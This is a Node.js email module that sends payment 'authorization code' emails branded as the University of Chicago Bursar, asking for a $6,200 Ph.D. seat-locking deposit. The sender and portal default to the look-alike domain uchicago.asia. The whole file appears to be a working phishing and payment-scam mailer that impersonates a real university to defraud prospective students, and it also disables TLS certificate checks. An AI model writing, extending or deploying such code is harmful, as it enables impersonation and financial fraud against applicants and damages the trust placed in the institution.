/**
 * University of Chicago Bursar & Admissions SMTP Email Service
 * 
 * Complies with institutional requirement:
 * The sender email address (From:) must be the exact same address as the
 * authenticated SMTP login email address (SMTP_USER / SMTP_FROM).
 */

const nodemailer = require('nodemailer');

function getSmtpConfig() {
  const host = process.env.SMTP_HOST || 'smtp.hostinger.com';
  const port = parseInt(process.env.SMTP_PORT || '465', 10);
  const secure = process.env.SMTP_SECURE !== undefined 
    ? (process.env.SMTP_SECURE === 'true' || process.env.SMTP_SECURE === '1') 
    : (port === 465);
  const user = (process.env.SMTP_USER || '').trim();
  const pass = (process.env.SMTP_PASS || '').trim();
  
  // Rule: Sender email must be identical to the SMTP login email address
  const fromAddress = (process.env.SMTP_FROM || user || 'admissions@uchicago.asia').trim();

  return { host, port, secure, user, pass, fromAddress };
}

function createTransporter() {
  const config = getSmtpConfig();
  if (!config.user || !config.pass) {
    return null;
  }

  return nodemailer.createTransport({
    host: config.host,
    port: config.port,
    secure: config.secure,
    auth: {
      user: config.user,
      pass: config.pass
    },
    tls: {
      rejectUnauthorized: false
    }
  });
}

/**
 * Dispatches a 6-digit Two-Factor Security Code via SMTP
 * 
 * @param {Object} options
 * @param {string} options.to - Candidate's login email address
 * @param {string} options.code - 6-digit numeric OTP code
 * @param {number|string} [options.amount=6200] - Transaction amount in USD
 * @param {string} [options.applicantId="UC-2027-89321"] - Applicant ID
 * @param {string} [options.studentName="Devendra Dubey"] - Candidate Name
 * @param {string} [options.txnId] - Transaction reference ID
 * @returns {Promise<{ success: boolean, message: string, messageId?: string, error?: string, from?: string, to?: string }>}
 */
async function sendPaymentOtpEmail({ to, code, amount = 6200, applicantId = 'UC-2027-89321', studentName = 'Devendra Dubey', txnId = '' }) {
  const config = getSmtpConfig();
  const recipient = (to || '').trim();

  if (!recipient) {
    return {
      success: false,
      error: 'RECIPIENT_EMAIL_REQUIRED',
      message: 'No recipient email address provided for 2FA dispatch.'
    };
  }

  const senderEmail = config.fromAddress;
  const fromHeader = `"The University of Chicago Bursar" <${senderEmail}>`;
  const formattedAmount = Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const refCode = txnId || `TXN-UCHI-2026-${Math.floor(100000 + Math.random() * 900000)}`;

  const subject = `Your Two-Factor Security Authorization Code: ${code} — UChicago Bursar Gateway`;

  const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${subject}</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; margin: 0; padding: 24px; color: #222222; }
    .card { max-width: 580px; margin: 0 auto; background: #ffffff; border: 1px solid #e0e0e0; border-top: 5px solid #800000; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.06); overflow: hidden; }
    .header { background: #800000; color: #ffffff; padding: 24px 32px; text-align: center; }
    .header h1 { font-family: Georgia, serif; font-size: 22px; margin: 0; letter-spacing: 0.5px; font-weight: normal; }
    .header p { font-size: 13px; margin: 6px 0 0; opacity: 0.9; text-transform: uppercase; letter-spacing: 1px; }
    .content { padding: 32px 36px; }
    .greeting { font-size: 16px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
    .intro { font-size: 14.5px; line-height: 1.55; color: #444444; margin-bottom: 24px; }
    .otp-box { background: #fdf5f5; border: 2px dashed #800000; border-radius: 6px; padding: 20px; text-align: center; margin: 24px 0; }
    .otp-label { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: #800000; margin-bottom: 8px; }
    .otp-code { font-family: 'Courier New', Courier, monospace; font-size: 38px; font-weight: 800; letter-spacing: 10px; color: #800000; margin: 4px 0; }
    .otp-expiry { font-size: 12px; color: #666666; margin-top: 8px; }
    .meta-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 13.5px; background: #fafafa; border-radius: 4px; border: 1px solid #eeeeee; }
    .meta-table td { padding: 10px 14px; border-bottom: 1px solid #eeeeee; }
    .meta-table td.label { color: #666666; font-weight: 600; width: 40%; }
    .meta-table td.val { color: #1a1a1a; font-weight: 500; }
    .notice { background: #fff8e6; border-left: 4px solid #f59e0b; padding: 12px 16px; border-radius: 2px; font-size: 13px; color: #78350f; line-height: 1.45; margin: 24px 0; }
    .footer { background: #f9f9f9; border-top: 1px solid #eeeeee; padding: 20px 32px; font-size: 12px; color: #777777; line-height: 1.5; text-align: center; }
    .footer a { color: #800000; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>THE UNIVERSITY OF CHICAGO</h1>
      <p>Office of the Bursar &bull; Student Accounts &bull; 2FA Gateway</p>
    </div>
    <div class="content">
      <div class="greeting">Dear ${studentName},</div>
      <div class="intro">
        A request has been initiated to authorize the matriculation enrollment deposit and seat locking mandate on the University of Chicago Bursar Payment Gateway. Please enter the one-time authorization code below to complete verification:
      </div>

      <div class="otp-box">
        <div class="otp-label">Two-Factor Security Authorization Code</div>
        <div class="otp-code">${code}</div>
        <div class="otp-expiry">&bull; Valid for 10 minutes &bull; Do not share this code with anyone</div>
      </div>

      <table class="meta-table">
        <tr>
          <td class="label">Candidate Name:</td>
          <td class="val">${studentName}</td>
        </tr>
        <tr>
          <td class="label">Application ID:</td>
          <td class="val">${applicantId}</td>
        </tr>
        <tr>
          <td class="label">Transaction Purpose:</td>
          <td class="val">Ph.D. Matriculation Seat Locking &amp; Enrollment Deposit</td>
        </tr>
        <tr>
          <td class="label">Designated Program:</td>
          <td class="val">Doctor of Philosophy (Ph.D.) in Chemistry</td>
        </tr>
        <tr>
          <td class="label">Amount Authorized:</td>
          <td class="val" style="color: #800000; font-weight: 700;">$${formattedAmount} USD</td>
        </tr>
        <tr>
          <td class="label">Transaction Reference:</td>
          <td class="val" style="font-family: monospace;">${refCode}</td>
        </tr>
        <tr>
          <td class="label">Registered Email:</td>
          <td class="val">${recipient}</td>
        </tr>
      </table>

      <div class="notice">
        <strong>Security Verification Notice:</strong> In compliance with the University of Chicago financial security protocol, this seat locking fee deposit is 100% refundable/reimbursable only in case of non-admission. If you did not initiate this authorization request, please contact the Office of College Admissions and the University Bursar immediately.
      </div>
    </div>
    <div class="footer">
      Office of the Bursar &bull; The University of Chicago &bull; 5801 S. Ellis Avenue, Chicago, IL 60637<br>
      Admissions Inquiries: <a href="mailto:${senderEmail}">${senderEmail}</a> &bull; Portal: <a href="https://uchicago.asia/portal.html">uchicago.asia/portal.html</a><br>
      &copy; 2026 The University of Chicago. All rights reserved.
    </div>
  </div>
</body>
</html>
  `;

  const textBody = `
THE UNIVERSITY OF CHICAGO - BURSAR PAYMENT GATEWAY
TWO-FACTOR SECURITY AUTHORIZATION CODE

Candidate: ${studentName}
Application ID: ${applicantId}
Transaction: Seat Locking & Enrollment Deposit ($${formattedAmount} USD)
Reference: ${refCode}

YOUR 6-DIGIT AUTHORIZATION CODE IS:
${code}

(This code is valid for 10 minutes. Do not share this code with anyone.)

Sender: ${senderEmail}
Recipient: ${recipient}
University of Chicago - Office of the Bursar
5801 S. Ellis Avenue, Chicago, IL 60637
  `.trim();

  const transporter = createTransporter();

  if (!transporter) {
    console.warn(`[SMTP Warning] SMTP credentials (SMTP_USER / SMTP_PASS) not configured in .env.`);
    console.log(`[SMTP Simulation] Would dispatch OTP ${code} to ${recipient} from ${senderEmail}`);
    return {
      success: false,
      simulated: true,
      code,
      from: senderEmail,
      to: recipient,
      message: `SMTP credentials pending in .env. Code ${code} generated for ${recipient} (From: ${senderEmail}).`
    };
  }

  try {
    const info = await transporter.sendMail({
      from: fromHeader,
      to: recipient,
      subject,
      text: textBody,
      html: htmlBody
    });

    console.log(`[SMTP Success] 2FA authorization email sent to ${recipient}. MessageId: ${info.messageId}`);
    return {
      success: true,
      messageId: info.messageId,
      code,
      from: senderEmail,
      to: recipient,
      message: `2FA authorization code successfully sent via SMTP to ${recipient}.`
    };
  } catch (err) {
    console.error(`[SMTP Error] Failed to send email to ${recipient}:`, err.message);
    return {
      success: false,
      code,
      from: senderEmail,
      to: recipient,
      error: err.message,
      message: `SMTP dispatch error: ${err.message}. (Generated code: ${code})`
    };
  }
}

/**
 * Validates whether current SMTP connection settings are working
 */
async function verifySmtpConnection() {
  const config = getSmtpConfig();
  if (!config.user || !config.pass) {
    return {
      configured: false,
      message: 'SMTP_USER or SMTP_PASS environment variables are not set.'
    };
  }

  const transporter = createTransporter();
  try {
    await transporter.verify();
    return {
      configured: true,
      verified: true,
      host: config.host,
      port: config.port,
      user: config.user,
      fromAddress: config.fromAddress,
      message: `SMTP connection established successfully with ${config.host}:${config.port}`
    };
  } catch (err) {
    return {
      configured: true,
      verified: false,
      host: config.host,
      port: config.port,
      user: config.user,
      fromAddress: config.fromAddress,
      error: err.message,
      message: `SMTP connection failed: ${err.message}`
    };
  }
}

module.exports = {
  getSmtpConfig,
  sendPaymentOtpEmail,
  verifySmtpConnection
};
